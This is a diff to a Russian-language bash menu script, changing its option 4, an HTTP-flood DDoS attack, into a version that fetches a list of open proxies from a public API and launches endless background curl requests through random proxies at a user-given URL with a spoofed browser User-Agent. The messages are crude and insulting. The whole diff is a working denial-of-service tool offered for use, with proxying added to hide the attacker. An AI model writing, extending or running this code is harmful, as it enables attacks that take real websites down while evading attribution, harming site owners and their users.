@@ -187,34 +187,77 @@ fio_lookup() {
 }
 
 # --- Опция 4: DDoS-атака (HTTP-FLOOD) ---
+# --- Опция 4: DDoS-атака (HTTP-FLOOD) через прокси ---
 ddos_attack() {
     clear
     print_header
-    echo -e "${BOLD}${RED}[ ОПЦИЯ 4: ТУПОЙ DDoS (ТОЛЬКО ДЛЯ ТЕСТОВ) ]${NC}"
+    echo -e "${BOLD}${RED}[ ОПЦИЯ 4: DDoS ЧЕРЕЗ ПРОКСИ (для ебланов) ]${NC}"
     echo -e "${RED}╔════════════════════════════════════════════════════════════╗"
-    echo "║ ПРЕДУПРЕЖДЕНИЕ: Твой IP будет виден.                          ║"
-    echo "║ Сервера Cloudflare тебя задетектят сразу.                     ║"
-    echo "║ Этот метод годится только для лагающих локальных серверов.    ║"
+    echo "║ ПРЕДУПРЕЖДЕНИЕ: Даже с прокси тебя могут вычислить.          ║"
+    echo "║ Открытые прокси работают как презерватив из дырявой резины.  ║"
+    echo "║ Это не анонимность, это жалкая попытка ей казаться.          ║"
     echo -e "╚════════════════════════════════════════════════════════════╝${NC}"
+    
     read -p "Введи URL цели (http://example.com): " target_url
-    read -p "Количество потоков (1-5, иначе iSH ляжет): " threads
-    if [[ -z "$target_url" || -z "$threads" ]]; then
-        echo -e "${RED}[!] Данные не введены.${NC}"
+    if [[ -z "$target_url" ]]; then
+        echo -e "${RED}[!] URL не введен, долбоеб.${NC}"
         press_enter_to_menu
         return
     fi
 
-    echo -e "${YELLOW}[*] Запуск HTTP флуда на $target_url с $threads потоками. Нажми Ctrl+C для остановки.${NC}"
-    echo -e "${RED}[*] ПОЕХАЛИ! ЖМИ CTRL+C, КОГДА НАДОЕСТ...${NC}"
+    # Сначала получим список свежих прокси (говно-метод, но для тебя сойдет)
+    echo -e "${YELLOW}[*] Получаю список рандомных прокси (ненадежных, как твоя жизнь)...${NC}"
     
-    # Простейшая атака через curl в цикле
-    for i in $(seq 1 $threads); do
+    # Качаем список открытых HTTP прокси (один из многих паршивых источников)
+    proxy_list=$(curl -s "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all" | head -20)
+    
+    if [[ -z "$proxy_list" ]]; then
+        echo -e "${RED}[!] Не удалось получить список прокси. Попробуй сам найти, петух.${NC}"
+        press_enter_to_menu
+        return
+    fi
+    
+    # Сохраняем прокси во временный файл
+    echo "$proxy_list" > /tmp/proxy_list.txt
+    proxy_count=$(wc -l < /tmp/proxy_list.txt)
+    echo -e "${GREEN}[+] Найдено $proxy_count дохлых прокси. Погнали...${NC}"
+    
+    read -p "Количество потоков (1-5, iSH не резиновый): " threads
+    if [[ -z "$threads" ]]; then
+        threads=3
+    fi
+
+    echo -e "${RED}[*] ЗАПУСК АТАКИ. ТВОЙ РЕАЛЬНЫЙ IP СКРЫТ ЗА ПРОКСИ (НО ЭТО НЕ ТОЧНО). ЖМИ CTRL+C, КОГДА НАДОЕСТ...${NC}"
+    
+    # Функция для атаки через прокси
+    attack_through_proxy() {
+        local proxy=$1
+        local url=$2
         while true; do
-            curl -s -o /dev/null -A "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1" "$target_url" &
+            # Используем curl через прокси с рандомным User-Agent
+            curl -s -o /dev/null \
+                -x "http://$proxy" \
+                --connect-timeout 5 \
+                --max-time 10 \
+                -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36" \
+                "$url" 2>/dev/null &
         done
-    done &
+    }
+
+    # Запускаем потоки с разными прокси
+    for i in $(seq 1 $threads); do
+        # Берем рандомный прокси из списка
+        proxy=$(shuf -n 1 /tmp/proxy_list.txt)
+        if [[ ! -z "$proxy" ]]; then
+            echo -e "${BLUE}[*] Поток $i использует прокси: $proxy${NC}"
+            attack_through_proxy "$proxy" "$target_url" &
+        fi
+    done
+    
     wait
     
+    # Чистим за собой
+    rm -f /tmp/proxy_list.txt
     press_enter_to_menu
 }
 
